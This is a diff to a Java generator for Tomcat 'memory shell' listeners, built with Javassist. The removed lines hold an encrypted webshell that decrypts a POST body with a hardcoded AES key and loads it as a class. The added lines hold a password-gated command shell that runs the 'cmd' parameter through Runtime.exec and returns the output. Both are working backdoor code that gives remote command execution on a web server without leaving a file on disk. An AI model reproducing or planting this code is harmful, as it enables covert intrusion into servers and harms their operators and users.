@@ -1,11 +1,11 @@
-package org.memshell;
+package org.memshell.tomcat;
 
 import javassist.*;
 
 import java.io.IOException;
 import java.util.UUID;
 
-public class TomcatListenerBehinder {
+public class TomcatListenerCMD {
     public static byte[] generateListenerMemShell() throws CannotCompileException, NotFoundException, IOException {
         //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
         UUID uuid = UUID.randomUUID();
@@ -43,30 +43,27 @@ public class TomcatListenerBehinder {
         // 创建requestInitialized方法
         CtMethod requestInitialized = CtNewMethod.make("public void requestInitialized(javax.servlet.ServletRequestEvent servletRequestEvent) {\n" +
                 "        try {\n" +
-                "            org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) servletRequestEvent.getServletRequest();"+
-                "            java.lang.reflect.Field requestField = requestFacade.getClass().getDeclaredField(\"request\");"+
-                "            requestField.setAccessible(true);"+
-                "            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) requestField.get(requestFacade);"+
-                "            org.apache.catalina.connector.Response response = request.getResponse();"+
-                "            javax.servlet.http.HttpSession session = request.getSession();"+
-                "            java.util.HashMap pageContext = new java.util.HashMap();\n" +
-                "            pageContext.put(\"request\", request);\n" +
-                "            pageContext.put(\"response\", response);\n" +
-                "            pageContext.put(\"session\", session);\n" +
-                "            if (request.getMethod().equals(\"POST\")) {"+
-                "               String k = \"47bce5c74f589f48\";"+
-                "               session.putValue(\"u\", k);"+
-                "               javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");"+
-                "               c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\"));"+
-                "               java.lang.ClassLoader contextClassLoader = java.lang.Thread.currentThread().getContextClassLoader();"+
-                "               Class aClass = Class.forName(\"java.lang.ClassLoader\");"+
-                "               java.lang.reflect.Method defineClass = aClass.getDeclaredMethod(\"defineClass\", new Class[]{String.class, byte[].class, int.class, int.class});"+
-                "               defineClass.setAccessible(true);" +
-                "               byte[] payload = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));" +
-                "               Class invoke = (Class) defineClass.invoke(contextClassLoader, new Object[]{null, payload, Integer.valueOf(0), Integer.valueOf(payload.length)});" +
-                "               invoke.newInstance().equals(pageContext);" +
-                "           }"+
-                "        } catch (Exception e) {\n" +
+                "            org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) servletRequestEvent.getServletRequest();\n" +
+                "            java.lang.reflect.Field requestField = requestFacade.getClass().getDeclaredField(\"request\");\n" +
+                "            requestField.setAccessible(true);\n" +
+                "            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) requestField.get(requestFacade);\n" +
+                "            org.apache.catalina.connector.Response response = request.getResponse();\n" +
+                "            String pass = request.getParameter(\"pass\");\n" +
+                "            if(pass != null && !pass.isEmpty() && request.getParameter(\"pass\").equals(\"aaa\")){\n" +
+                "                String cmd = request.getParameter(\"cmd\");\n" +
+                "                if (cmd != null && !cmd.isEmpty()){\n" +
+                "                    java.lang.Process exec = Runtime.getRuntime().exec(cmd);\n" +
+                "                    java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(exec.getInputStream()));\n" +
+                "                    java.lang.StringBuilder output = new java.lang.StringBuilder();\n" +
+                "                    String line;\n" +
+                "                    while ((line = reader.readLine()) != null) {\n" +
+                "                        output.append(line).append(\"\\n\");\n" +
+                "                    }\n" +
+                "                    int exitCode = exec.waitFor();\n" +
+                "                    response.getWriter().write(output.toString());\n" +
+                "                }\n" +
+                "            }\n" +
+                "        }catch (Exception e){\n" +
                 "            e.printStackTrace();\n" +
                 "        }\n" +
                 "    }", ctClass);
